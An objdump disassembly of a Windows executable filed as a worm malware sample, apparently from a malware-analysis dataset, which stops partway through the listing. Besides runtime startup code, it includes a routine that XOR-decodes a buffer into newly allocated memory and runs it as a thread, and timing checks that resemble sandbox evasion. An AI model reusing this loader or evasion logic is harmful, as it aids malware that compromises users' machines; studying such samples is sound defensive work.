
malware_samples/worm/1b33db8b1a89bef81346daf2192d0f7cc3c8e4595d9349dc439aa263ace795bc.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	c3                   	ret
   140001001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001008:	00 00 00 00 
   14000100c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001010:	55                   	push   %rbp
   140001011:	48 89 e5             	mov    %rsp,%rbp
   140001014:	48 83 ec 20          	sub    $0x20,%rsp
   140001018:	48 8b 05 c1 33 00 00 	mov    0x33c1(%rip),%rax        # 0x1400043e0
   14000101f:	31 c9                	xor    %ecx,%ecx
   140001021:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001027:	48 8b 05 c2 33 00 00 	mov    0x33c2(%rip),%rax        # 0x1400043f0
   14000102e:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001034:	48 8b 05 c5 33 00 00 	mov    0x33c5(%rip),%rax        # 0x140004400
   14000103b:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001041:	48 8b 05 48 33 00 00 	mov    0x3348(%rip),%rax        # 0x140004390
   140001048:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   14000104d:	75 0f                	jne    0x14000105e
   14000104f:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   140001053:	48 01 d0             	add    %rdx,%rax
   140001056:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   14000105c:	74 6a                	je     0x1400010c8
   14000105e:	48 8b 05 6b 33 00 00 	mov    0x336b(%rip),%rax        # 0x1400043d0
   140001065:	89 0d a1 5f 00 00    	mov    %ecx,0x5fa1(%rip)        # 0x14000700c
   14000106b:	8b 00                	mov    (%rax),%eax
   14000106d:	85 c0                	test   %eax,%eax
   14000106f:	74 47                	je     0x1400010b8
   140001071:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001076:	e8 5d 17 00 00       	call   0x1400027d8
   14000107b:	e8 d0 16 00 00       	call   0x140002750
   140001080:	48 8b 15 19 34 00 00 	mov    0x3419(%rip),%rdx        # 0x1400044a0
   140001087:	8b 12                	mov    (%rdx),%edx
   140001089:	89 10                	mov    %edx,(%rax)
   14000108b:	e8 d0 16 00 00       	call   0x140002760
   140001090:	48 8b 15 e9 33 00 00 	mov    0x33e9(%rip),%rdx        # 0x140004480
   140001097:	8b 12                	mov    (%rdx),%edx
   140001099:	89 10                	mov    %edx,(%rax)
   14000109b:	e8 90 06 00 00       	call   0x140001730
   1400010a0:	48 8b 05 99 32 00 00 	mov    0x3299(%rip),%rax        # 0x140004340
   1400010a7:	83 38 01             	cmpl   $0x1,(%rax)
   1400010aa:	74 54                	je     0x140001100
   1400010ac:	31 c0                	xor    %eax,%eax
   1400010ae:	48 83 c4 20          	add    $0x20,%rsp
   1400010b2:	5d                   	pop    %rbp
   1400010b3:	c3                   	ret
   1400010b4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010b8:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400010bd:	e8 16 17 00 00       	call   0x1400027d8
   1400010c2:	eb b7                	jmp    0x14000107b
   1400010c4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010c8:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400010cc:	66 81 fa 0b 01       	cmp    $0x10b,%dx
   1400010d1:	74 45                	je     0x140001118
   1400010d3:	66 81 fa 0b 02       	cmp    $0x20b,%dx
   1400010d8:	75 84                	jne    0x14000105e
   1400010da:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400010e1:	0f 86 77 ff ff ff    	jbe    0x14000105e
   1400010e7:	8b 90 f8 00 00 00    	mov    0xf8(%rax),%edx
   1400010ed:	31 c9                	xor    %ecx,%ecx
   1400010ef:	85 d2                	test   %edx,%edx
   1400010f1:	0f 95 c1             	setne  %cl
   1400010f4:	e9 65 ff ff ff       	jmp    0x14000105e
   1400010f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001100:	48 8b 0d b9 33 00 00 	mov    0x33b9(%rip),%rcx        # 0x1400044c0
   140001107:	e8 94 0d 00 00       	call   0x140001ea0
   14000110c:	31 c0                	xor    %eax,%eax
   14000110e:	48 83 c4 20          	add    $0x20,%rsp
   140001112:	5d                   	pop    %rbp
   140001113:	c3                   	ret
   140001114:	0f 1f 40 00          	nopl   0x0(%rax)
   140001118:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   14000111c:	0f 86 3c ff ff ff    	jbe    0x14000105e
   140001122:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
   140001129:	31 c9                	xor    %ecx,%ecx
   14000112b:	45 85 c0             	test   %r8d,%r8d
   14000112e:	0f 95 c1             	setne  %cl
   140001131:	e9 28 ff ff ff       	jmp    0x14000105e
   140001136:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000113d:	00 00 00 
   140001140:	55                   	push   %rbp
   140001141:	48 89 e5             	mov    %rsp,%rbp
   140001144:	48 83 ec 30          	sub    $0x30,%rsp
   140001148:	48 8b 05 81 33 00 00 	mov    0x3381(%rip),%rax        # 0x1400044d0
   14000114f:	4c 8d 05 c2 5e 00 00 	lea    0x5ec2(%rip),%r8        # 0x140007018
   140001156:	48 8d 15 c3 5e 00 00 	lea    0x5ec3(%rip),%rdx        # 0x140007020
   14000115d:	48 8d 0d c4 5e 00 00 	lea    0x5ec4(%rip),%rcx        # 0x140007028
   140001164:	8b 00                	mov    (%rax),%eax
   140001166:	89 05 98 5e 00 00    	mov    %eax,0x5e98(%rip)        # 0x140007004
   14000116c:	48 8b 05 1d 33 00 00 	mov    0x331d(%rip),%rax        # 0x140004490
   140001173:	44 8b 08             	mov    (%rax),%r9d
   140001176:	48 8d 05 87 5e 00 00 	lea    0x5e87(%rip),%rax        # 0x140007004
   14000117d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001182:	e8 41 16 00 00       	call   0x1400027c8
   140001187:	90                   	nop
   140001188:	48 83 c4 30          	add    $0x30,%rsp
   14000118c:	5d                   	pop    %rbp
   14000118d:	c3                   	ret
   14000118e:	66 90                	xchg   %ax,%ax
   140001190:	55                   	push   %rbp
   140001191:	41 55                	push   %r13
   140001193:	41 54                	push   %r12
   140001195:	57                   	push   %rdi
   140001196:	56                   	push   %rsi
   140001197:	53                   	push   %rbx
   140001198:	48 83 ec 28          	sub    $0x28,%rsp
   14000119c:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400011a1:	48 8b 1d 78 32 00 00 	mov    0x3278(%rip),%rbx        # 0x140004420
   1400011a8:	4c 8b 25 61 70 00 00 	mov    0x7061(%rip),%r12        # 0x140008210
   1400011af:	31 ff                	xor    %edi,%edi
   1400011b1:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400011b8:	00 00 
   1400011ba:	48 8b 70 08          	mov    0x8(%rax),%rsi
   1400011be:	eb 11                	jmp    0x1400011d1
   1400011c0:	48 39 c6             	cmp    %rax,%rsi
   1400011c3:	0f 84 6f 01 00 00    	je     0x140001338
   1400011c9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011ce:	41 ff d4             	call   *%r12
   1400011d1:	48 89 f8             	mov    %rdi,%rax
   1400011d4:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   1400011d9:	48 85 c0             	test   %rax,%rax
   1400011dc:	75 e2                	jne    0x1400011c0
   1400011de:	48 8b 35 4b 32 00 00 	mov    0x324b(%rip),%rsi        # 0x140004430
   1400011e5:	31 ff                	xor    %edi,%edi
   1400011e7:	8b 06                	mov    (%rsi),%eax
   1400011e9:	83 f8 01             	cmp    $0x1,%eax
   1400011ec:	0f 84 5d 01 00 00    	je     0x14000134f
   1400011f2:	8b 06                	mov    (%rsi),%eax
   1400011f4:	85 c0                	test   %eax,%eax
   1400011f6:	0f 84 b4 01 00 00    	je     0x1400013b0
   1400011fc:	c7 05 02 5e 00 00 01 	movl   $0x1,0x5e02(%rip)        # 0x140007008
   140001203:	00 00 00 
   140001206:	8b 06                	mov    (%rsi),%eax
   140001208:	83 f8 01             	cmp    $0x1,%eax
   14000120b:	0f 84 53 01 00 00    	je     0x140001364
   140001211:	85 ff                	test   %edi,%edi
   140001213:	0f 84 6c 01 00 00    	je     0x140001385
   140001219:	48 8b 05 60 31 00 00 	mov    0x3160(%rip),%rax        # 0x140004380
   140001220:	48 8b 00             	mov    (%rax),%rax
   140001223:	48 85 c0             	test   %rax,%rax
   140001226:	74 0c                	je     0x140001234
   140001228:	45 31 c0             	xor    %r8d,%r8d
   14000122b:	ba 02 00 00 00       	mov    $0x2,%edx
   140001230:	31 c9                	xor    %ecx,%ecx
   140001232:	ff d0                	call   *%rax
   140001234:	e8 c7 08 00 00       	call   0x140001b00
   140001239:	48 8b 0d 70 32 00 00 	mov    0x3270(%rip),%rcx        # 0x1400044b0
   140001240:	ff 15 c2 6f 00 00    	call   *0x6fc2(%rip)        # 0x140008208
   140001246:	48 8b 15 c3 31 00 00 	mov    0x31c3(%rip),%rdx        # 0x140004410
   14000124d:	48 8d 0d ac fd ff ff 	lea    -0x254(%rip),%rcx        # 0x140001000
   140001254:	48 89 02             	mov    %rax,(%rdx)
   140001257:	e8 24 15 00 00       	call   0x140002780
   14000125c:	e8 af 06 00 00       	call   0x140001910
   140001261:	8b 1d c1 5d 00 00    	mov    0x5dc1(%rip),%ebx        # 0x140007028
   140001267:	8d 7b 01             	lea    0x1(%rbx),%edi
   14000126a:	48 63 ff             	movslq %edi,%rdi
   14000126d:	48 c1 e7 03          	shl    $0x3,%rdi
   140001271:	48 89 f9             	mov    %rdi,%rcx
   140001274:	e8 bf 15 00 00       	call   0x140002838
   140001279:	4c 8b 2d a0 5d 00 00 	mov    0x5da0(%rip),%r13        # 0x140007020
   140001280:	49 89 c4             	mov    %rax,%r12
   140001283:	85 db                	test   %ebx,%ebx
   140001285:	0f 8e 45 01 00 00    	jle    0x1400013d0
   14000128b:	48 83 ef 08          	sub    $0x8,%rdi
   14000128f:	31 db                	xor    %ebx,%ebx
   140001291:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001298:	49 8b 4c 1d 00       	mov    0x0(%r13,%rbx,1),%rcx
   14000129d:	e8 ae 15 00 00       	call   0x140002850
   1400012a2:	48 8d 70 01          	lea    0x1(%rax),%rsi
   1400012a6:	48 89 f1             	mov    %rsi,%rcx
   1400012a9:	e8 8a 15 00 00       	call   0x140002838
   1400012ae:	49 89 f0             	mov    %rsi,%r8
   1400012b1:	49 89 04 1c          	mov    %rax,(%r12,%rbx,1)
   1400012b5:	49 8b 54 1d 00       	mov    0x0(%r13,%rbx,1),%rdx
   1400012ba:	48 89 c1             	mov    %rax,%rcx
   1400012bd:	48 83 c3 08          	add    $0x8,%rbx
   1400012c1:	e8 7a 15 00 00       	call   0x140002840
   1400012c6:	48 39 df             	cmp    %rbx,%rdi
   1400012c9:	75 cd                	jne    0x140001298
   1400012cb:	4c 01 e7             	add    %r12,%rdi
   1400012ce:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   1400012d5:	4c 89 25 44 5d 00 00 	mov    %r12,0x5d44(%rip)        # 0x140007020
   1400012dc:	e8 2f 04 00 00       	call   0x140001710
   1400012e1:	48 8b 05 b8 30 00 00 	mov    0x30b8(%rip),%rax        # 0x1400043a0
   1400012e8:	4c 8b 05 29 5d 00 00 	mov    0x5d29(%rip),%r8        # 0x140007018
   1400012ef:	8b 0d 33 5d 00 00    	mov    0x5d33(%rip),%ecx        # 0x140007028
   1400012f5:	48 8b 00             	mov    (%rax),%rax
   1400012f8:	4c 89 00             	mov    %r8,(%rax)
   1400012fb:	48 8b 15 1e 5d 00 00 	mov    0x5d1e(%rip),%rdx        # 0x140007020
   140001302:	e8 f9 15 00 00       	call   0x140002900
   140001307:	8b 0d ff 5c 00 00    	mov    0x5cff(%rip),%ecx        # 0x14000700c
   14000130d:	89 05 fd 5c 00 00    	mov    %eax,0x5cfd(%rip)        # 0x140007010
   140001313:	85 c9                	test   %ecx,%ecx
   140001315:	0f 84 bd 00 00 00    	je     0x1400013d8
   14000131b:	8b 15 e7 5c 00 00    	mov    0x5ce7(%rip),%edx        # 0x140007008
   140001321:	85 d2                	test   %edx,%edx
   140001323:	74 6b                	je     0x140001390
   140001325:	48 83 c4 28          	add    $0x28,%rsp
   140001329:	5b                   	pop    %rbx
   14000132a:	5e                   	pop    %rsi
   14000132b:	5f                   	pop    %rdi
   14000132c:	41 5c                	pop    %r12
   14000132e:	41 5d                	pop    %r13
   140001330:	5d                   	pop    %rbp
   140001331:	c3                   	ret
   140001332:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001338:	48 8b 35 f1 30 00 00 	mov    0x30f1(%rip),%rsi        # 0x140004430
   14000133f:	bf 01 00 00 00       	mov    $0x1,%edi
   140001344:	8b 06                	mov    (%rsi),%eax
   140001346:	83 f8 01             	cmp    $0x1,%eax
   140001349:	0f 85 a3 fe ff ff    	jne    0x1400011f2
   14000134f:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   140001354:	e8 8f 14 00 00       	call   0x1400027e8
   140001359:	8b 06                	mov    (%rsi),%eax
   14000135b:	83 f8 01             	cmp    $0x1,%eax
   14000135e:	0f 85 ad fe ff ff    	jne    0x140001211
   140001364:	48 8b 15 e5 30 00 00 	mov    0x30e5(%rip),%rdx        # 0x140004450
   14000136b:	48 8b 0d ce 30 00 00 	mov    0x30ce(%rip),%rcx        # 0x140004440
   140001372:	e8 81 14 00 00       	call   0x1400027f8
   140001377:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
   14000137d:	85 ff                	test   %edi,%edi
   14000137f:	0f 85 94 fe ff ff    	jne    0x140001219
   140001385:	31 c0                	xor    %eax,%eax
   140001387:	48 87 03             	xchg   %rax,(%rbx)
   14000138a:	e9 8a fe ff ff       	jmp    0x140001219
   14000138f:	90                   	nop
   140001390:	e8 5b 14 00 00       	call   0x1400027f0
   140001395:	8b 05 75 5c 00 00    	mov    0x5c75(%rip),%eax        # 0x140007010
   14000139b:	48 83 c4 28          	add    $0x28,%rsp
   14000139f:	5b                   	pop    %rbx
   1400013a0:	5e                   	pop    %rsi
   1400013a1:	5f                   	pop    %rdi
   1400013a2:	41 5c                	pop    %r12
   1400013a4:	41 5d                	pop    %r13
   1400013a6:	5d                   	pop    %rbp
   1400013a7:	c3                   	ret
   1400013a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400013af:	00 
   1400013b0:	48 8b 15 b9 30 00 00 	mov    0x30b9(%rip),%rdx        # 0x140004470
   1400013b7:	48 8b 0d a2 30 00 00 	mov    0x30a2(%rip),%rcx        # 0x140004460
   1400013be:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
   1400013c4:	e8 2f 14 00 00       	call   0x1400027f8
   1400013c9:	e9 38 fe ff ff       	jmp    0x140001206
   1400013ce:	66 90                	xchg   %ax,%ax
   1400013d0:	48 89 c7             	mov    %rax,%rdi
   1400013d3:	e9 f6 fe ff ff       	jmp    0x1400012ce
   1400013d8:	89 c1                	mov    %eax,%ecx
   1400013da:	e8 39 14 00 00       	call   0x140002818
   1400013df:	90                   	nop
   1400013e0:	55                   	push   %rbp
   1400013e1:	48 89 e5             	mov    %rsp,%rbp
   1400013e4:	48 83 ec 20          	sub    $0x20,%rsp
   1400013e8:	48 8b 05 e1 2f 00 00 	mov    0x2fe1(%rip),%rax        # 0x1400043d0
   1400013ef:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400013f5:	e8 96 fd ff ff       	call   0x140001190
   1400013fa:	90                   	nop
   1400013fb:	90                   	nop
   1400013fc:	48 83 c4 20          	add    $0x20,%rsp
   140001400:	5d                   	pop    %rbp
   140001401:	c3                   	ret
   140001402:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001409:	00 00 00 00 
   14000140d:	0f 1f 00             	nopl   (%rax)
   140001410:	55                   	push   %rbp
   140001411:	48 89 e5             	mov    %rsp,%rbp
   140001414:	48 83 ec 20          	sub    $0x20,%rsp
   140001418:	48 8b 05 b1 2f 00 00 	mov    0x2fb1(%rip),%rax        # 0x1400043d0
   14000141f:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001425:	e8 66 fd ff ff       	call   0x140001190
   14000142a:	90                   	nop
   14000142b:	90                   	nop
   14000142c:	48 83 c4 20          	add    $0x20,%rsp
   140001430:	5d                   	pop    %rbp
   140001431:	c3                   	ret
   140001432:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001439:	00 00 00 00 
   14000143d:	0f 1f 00             	nopl   (%rax)
   140001440:	55                   	push   %rbp
   140001441:	48 89 e5             	mov    %rsp,%rbp
   140001444:	48 83 ec 20          	sub    $0x20,%rsp
   140001448:	e8 b3 13 00 00       	call   0x140002800
   14000144d:	48 83 f8 01          	cmp    $0x1,%rax
   140001451:	19 c0                	sbb    %eax,%eax
   140001453:	48 83 c4 20          	add    $0x20,%rsp
   140001457:	5d                   	pop    %rbp
   140001458:	c3                   	ret
   140001459:	90                   	nop
   14000145a:	90                   	nop
   14000145b:	90                   	nop
   14000145c:	90                   	nop
   14000145d:	90                   	nop
   14000145e:	90                   	nop
   14000145f:	90                   	nop
   140001460:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140001470
   140001467:	e9 d4 ff ff ff       	jmp    0x140001440
   14000146c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001470:	c3                   	ret
   140001471:	90                   	nop
   140001472:	90                   	nop
   140001473:	90                   	nop
   140001474:	90                   	nop
   140001475:	90                   	nop
   140001476:	90                   	nop
   140001477:	90                   	nop
   140001478:	90                   	nop
   140001479:	90                   	nop
   14000147a:	90                   	nop
   14000147b:	90                   	nop
   14000147c:	90                   	nop
   14000147d:	90                   	nop
   14000147e:	90                   	nop
   14000147f:	90                   	nop
   140001480:	48 ff e1             	rex.W jmp *%rcx
   140001483:	48 63 05 82 1b 00 00 	movslq 0x1b82(%rip),%rax        # 0x14000300c
   14000148a:	85 c0                	test   %eax,%eax
   14000148c:	7e 26                	jle    0x1400014b4
   14000148e:	83 3d 7b 1b 00 00 00 	cmpl   $0x0,0x1b7b(%rip)        # 0x140003010
   140001495:	7e 1d                	jle    0x1400014b4
   140001497:	48 8b 15 42 6d 00 00 	mov    0x6d42(%rip),%rdx        # 0x1400081e0
   14000149e:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1400014a2:	48 8b 15 3f 6d 00 00 	mov    0x6d3f(%rip),%rdx        # 0x1400081e8
   1400014a9:	48 63 05 60 1b 00 00 	movslq 0x1b60(%rip),%rax        # 0x140003010
   1400014b0:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1400014b4:	c3                   	ret
   1400014b5:	41 54                	push   %r12
   1400014b7:	55                   	push   %rbp
   1400014b8:	57                   	push   %rdi
   1400014b9:	56                   	push   %rsi
   1400014ba:	53                   	push   %rbx
   1400014bb:	48 83 ec 40          	sub    $0x40,%rsp
   1400014bf:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400014c5:	4c 63 e2             	movslq %edx,%r12
   1400014c8:	48 89 cf             	mov    %rcx,%rdi
   1400014cb:	4c 89 c5             	mov    %r8,%rbp
   1400014ce:	31 c9                	xor    %ecx,%ecx
   1400014d0:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   1400014d6:	4c 89 e2             	mov    %r12,%rdx
   1400014d9:	4c 89 e6             	mov    %r12,%rsi
   1400014dc:	ff 15 3e 6d 00 00    	call   *0x6d3e(%rip)        # 0x140008220
   1400014e2:	48 89 c3             	mov    %rax,%rbx
   1400014e5:	31 c0                	xor    %eax,%eax
   1400014e7:	39 c6                	cmp    %eax,%esi
   1400014e9:	7e 15                	jle    0x140001500
   1400014eb:	48 89 c2             	mov    %rax,%rdx
   1400014ee:	83 e2 03             	and    $0x3,%edx
   1400014f1:	8a 54 15 00          	mov    0x0(%rbp,%rdx,1),%dl
   1400014f5:	32 14 07             	xor    (%rdi,%rax,1),%dl
   1400014f8:	88 14 03             	mov    %dl,(%rbx,%rax,1)
   1400014fb:	48 ff c0             	inc    %rax
   1400014fe:	eb e7                	jmp    0x1400014e7
   140001500:	48 89 d9             	mov    %rbx,%rcx
   140001503:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
   140001508:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   14000150e:	e8 70 ff ff ff       	call   0x140001483
   140001513:	4c 89 e2             	mov    %r12,%rdx
   140001516:	ff 15 0c 6d 00 00    	call   *0x6d0c(%rip)        # 0x140008228
   14000151c:	31 c0                	xor    %eax,%eax
   14000151e:	31 d2                	xor    %edx,%edx
   140001520:	49 89 d9             	mov    %rbx,%r9
   140001523:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140001527:	4c 8d 05 52 ff ff ff 	lea    -0xae(%rip),%r8        # 0x140001480
   14000152e:	31 d2                	xor    %edx,%edx
   140001530:	31 c9                	xor    %ecx,%ecx
   140001532:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001537:	ff 15 7b 6c 00 00    	call   *0x6c7b(%rip)        # 0x1400081b8
   14000153d:	90                   	nop
   14000153e:	48 83 c4 40          	add    $0x40,%rsp
   140001542:	5b                   	pop    %rbx
   140001543:	5e                   	pop    %rsi
   140001544:	5f                   	pop    %rdi
   140001545:	5d                   	pop    %rbp
   140001546:	41 5c                	pop    %r12
   140001548:	c3                   	ret
   140001549:	90                   	nop
   14000154a:	90                   	nop
   14000154b:	90                   	nop
   14000154c:	90                   	nop
   14000154d:	90                   	nop
   14000154e:	90                   	nop
   14000154f:	90                   	nop
   140001550:	41 55                	push   %r13
   140001552:	41 54                	push   %r12
   140001554:	55                   	push   %rbp
   140001555:	57                   	push   %rdi
   140001556:	56                   	push   %rsi
   140001557:	53                   	push   %rbx
   140001558:	48 83 ec 68          	sub    $0x68,%rsp
   14000155c:	ff 15 6e 6c 00 00    	call   *0x6c6e(%rip)        # 0x1400081d0
   140001562:	41 b9 2a 00 00 00    	mov    $0x2a,%r9d
   140001568:	41 b8 17 00 00 00    	mov    $0x17,%r8d
   14000156e:	ba 02 04 00 00       	mov    $0x402,%edx
   140001573:	89 c1                	mov    %eax,%ecx
   140001575:	ff 15 95 6d 00 00    	call   *0x6d95(%rip)        # 0x140008310
   14000157b:	31 c0                	xor    %eax,%eax
   14000157d:	45 31 c9             	xor    %r9d,%r9d
   140001580:	45 31 c0             	xor    %r8d,%r8d
   140001583:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140001587:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000158b:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001590:	ff 15 72 6d 00 00    	call   *0x6d72(%rip)        # 0x140008308
   140001596:	85 c0                	test   %eax,%eax
   140001598:	0f 84 87 00 00 00    	je     0x140001625
   14000159e:	81 7c 24 38 02 04 00 	cmpl   $0x402,0x38(%rsp)
   1400015a5:	00 
   1400015a6:	75 7d                	jne    0x140001625
   1400015a8:	48 83 7c 24 40 17    	cmpq   $0x17,0x40(%rsp)
   1400015ae:	75 75                	jne    0x140001625
   1400015b0:	48 83 7c 24 48 2a    	cmpq   $0x2a,0x48(%rsp)
   1400015b6:	75 6d                	jne    0x140001625
   1400015b8:	48 8b 35 31 6c 00 00 	mov    0x6c31(%rip),%rsi        # 0x1400081f0
   1400015bf:	ff d6                	call   *%rsi
   1400015c1:	b9 8a 02 00 00       	mov    $0x28a,%ecx
   1400015c6:	89 c3                	mov    %eax,%ebx
   1400015c8:	ff 15 42 6c 00 00    	call   *0x6c42(%rip)        # 0x140008210
   1400015ce:	ff d6                	call   *%rsi
   1400015d0:	2d 58 02 00 00       	sub    $0x258,%eax
   1400015d5:	29 d8                	sub    %ebx,%eax
   1400015d7:	3d 2b 01 00 00       	cmp    $0x12b,%eax
   1400015dc:	77 47                	ja     0x140001625
   1400015de:	4c 8b 25 fb 2e 00 00 	mov    0x2efb(%rip),%r12        # 0x1400044e0
   1400015e5:	49 63 6c 24 04       	movslq 0x4(%r12),%rbp
   1400015ea:	49 8d 74 24 14       	lea    0x14(%r12),%rsi
   1400015ef:	48 89 e9             	mov    %rbp,%rcx
   1400015f2:	e8 41 12 00 00       	call   0x140002838
   1400015f7:	48 89 e9             	mov    %rbp,%rcx
   1400015fa:	4d 8d 44 24 08       	lea    0x8(%r12),%r8
   1400015ff:	89 ea                	mov    %ebp,%edx
   140001601:	48 89 c7             	mov    %rax,%rdi
   140001604:	48 89 c3             	mov    %rax,%rbx
   140001607:	f3 a4                	rep movsb (%rsi),(%rdi)
   140001609:	48 89 c1             	mov    %rax,%rcx
   14000160c:	e8 a4 fe ff ff       	call   0x1400014b5
   140001611:	48 89 d9             	mov    %rbx,%rcx
   140001614:	48 83 c4 68          	add    $0x68,%rsp
   140001618:	5b                   	pop    %rbx
   140001619:	5e                   	pop    %rsi
   14000161a:	5f                   	pop    %rdi
   14000161b:	5d                   	pop    %rbp
   14000161c:	41 5c                	pop    %r12
   14000161e:	41 5d                	pop    %r13
   140001620:	e9 03 12 00 00       	jmp    0x140002828
   140001625:	48 83 c4 68          	add    $0x68,%rsp
   140001629:	5b                   	pop    %rbx
   14000162a:	5e                   	pop    %rsi
   14000162b:	5f                   	pop    %rdi
   14000162c:	5d                   	pop    %rbp
   14000162d:	41 5c                	pop    %r12
   14000162f:	41 5d                	pop    %r13
   140001631:	c3                   	ret
   140001632:	90                   	nop
   140001633:	90                   	nop
   140001634:	90                   	nop
   140001635:	90                   	nop
   140001636:	90                   	nop
   140001637:	90                   	nop
   140001638:	90                   	nop
   140001639:	90                   	nop
   14000163a:	90                   	nop
   14000163b:	90                   	nop
   14000163c:	90                   	nop
   14000163d:	90                   	nop
   14000163e:	90                   	nop
   14000163f:	90                   	nop
   140001640:	55                   	push   %rbp
   140001641:	48 89 e5             	mov    %rsp,%rbp
   140001644:	48 83 ec 20          	sub    $0x20,%rsp
   140001648:	48 8b 05 b1 1d 00 00 	mov    0x1db1(%rip),%rax        # 0x140003400
   14000164f:	48 8b 00             	mov    (%rax),%rax
   140001652:	48 85 c0             	test   %rax,%rax
   140001655:	74 26                	je     0x14000167d
   140001657:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000165e:	00 00 
   140001660:	ff d0                	call   *%rax
   140001662:	48 8b 05 97 1d 00 00 	mov    0x1d97(%rip),%rax        # 0x140003400
   140001669:	48 8d 50 08          	lea    0x8(%rax),%rdx
   14000166d:	48 8b 40 08          	mov    0x8(%rax),%rax
   140001671:	48 89 15 88 1d 00 00 	mov    %rdx,0x1d88(%rip)        # 0x140003400
   140001678:	48 85 c0             	test   %rax,%rax
   14000167b:	75 e3                	jne    0x140001660
   14000167d:	48 83 c4 20          	add    $0x20,%rsp
   140001681:	5d                   	pop    %rbp
   140001682:	c3                   	ret
   140001683:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000168a:	00 00 00 00 
   14000168e:	66 90                	xchg   %ax,%ax
   140001690:	55                   	push   %rbp
   140001691:	56                   	push   %rsi
   140001692:	53                   	push   %rbx
   140001693:	48 83 ec 20          	sub    $0x20,%rsp
   140001697:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000169c:	48 8b 15 ad 2c 00 00 	mov    0x2cad(%rip),%rdx        # 0x140004350
   1400016a3:	48 8b 02             	mov    (%rdx),%rax
   1400016a6:	89 c1                	mov    %eax,%ecx
   1400016a8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400016ab:	74 43                	je     0x1400016f0
   1400016ad:	85 c9                	test   %ecx,%ecx
   1400016af:	74 22                	je     0x1400016d3
   1400016b1:	89 c8                	mov    %ecx,%eax
   1400016b3:	83 e9 01             	sub    $0x1,%ecx
   1400016b6:	48 8d 1c c2          	lea    (%rdx,%rax,8),%rbx
   1400016ba:	48 29 c8             	sub    %rcx,%rax
   1400016bd:	48 8d 74 c2 f8       	lea    -0x8(%rdx,%rax,8),%rsi
   1400016c2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400016c8:	ff 13                	call   *(%rbx)
   1400016ca:	48 83 eb 08          	sub    $0x8,%rbx
   1400016ce:	48 39 f3             	cmp    %rsi,%rbx
   1400016d1:	75 f5                	jne    0x1400016c8
   1400016d3:	48 8d 0d 66 ff ff ff 	lea    -0x9a(%rip),%rcx        # 0x140001640
   1400016da:	48 83 c4 20          	add    $0x20,%rsp
   1400016de:	5b                   	pop    %rbx
   1400016df:	5e                   	pop    %rsi
   1400016e0:	5d                   	pop    %rbp
   1400016e1:	e9 5a fd ff ff       	jmp    0x140001440
   1400016e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400016ed:	00 00 00 
   1400016f0:	31 c0                	xor    %eax,%eax
   1400016f2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400016f8:	44 8d 40 01          	lea    0x1(%rax),%r8d
   1400016fc:	89 c1                	mov    %eax,%ecx
   1400016fe:	4a 83 3c c2 00       	cmpq   $0x0,(%rdx,%r8,8)
   140001703:	4c 89 c0             	mov    %r8,%rax
   140001706:	75 f0                	jne    0x1400016f8
   140001708:	eb a3                	jmp    0x1400016ad
   14000170a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001710:	8b 05 1a 59 00 00    	mov    0x591a(%rip),%eax        # 0x140007030
   140001716:	85 c0                	test   %eax,%eax
